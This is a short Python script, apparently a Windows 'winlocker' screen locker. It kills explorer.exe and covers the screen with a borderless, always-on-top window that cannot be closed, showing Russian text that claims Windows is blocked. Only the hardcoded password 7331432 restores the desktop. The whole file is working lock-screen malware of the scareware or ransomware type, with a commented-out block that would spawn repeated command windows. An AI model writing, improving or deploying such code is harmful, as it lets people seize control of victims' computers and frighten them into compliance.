from time import sleep
from tkinter import *
import subprocess

root = Tk()

startcmd = 0
def quit():
  pass

def CheckPass(event = None):
  global startcmd
  if password.get() == "7331432":
    subprocess.Popen('start explorer.exe', shell=True)
    exit()
  else:
    startcmd == 1
    # while startcmd < 5 and startcmd != 0:
    #   print("start cmd")
    #   startcmd += 1
    #   sleep(0.5)
    # subprocess.Popen('start cmd', shell=True)
    wrong_label["text"] = "Неверный пароль"

x = root.winfo_screenwidth()
Y = root.winfo_screenheight()
font = "Arial 25 bold"

bg = "black"
root["bg"]  = bg 
root.protocol("WM_DELETE_WINDOW", quit)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.geometry(f"{x}x{Y}")
Label(text="ВАШ Windows заблокирован", fg="red", bg=bg, font=font).pack()
Label(text="\n\n\n\nВведите пароль", fg="white", bg=bg, font=font).pack()
wrong_label = Label( fg="red", bg=bg, font=font)
subprocess.Popen('Taskkill /f /im explorer.exe', shell=True)

button = Button(text="Разблокировать", font=font, command=CheckPass)
button.place(x=100, y=100)


password = Entry(font=font)
password.pack()
wrong_label.pack()
password.bind("<Return>", CheckPass)

























root.mainloop()
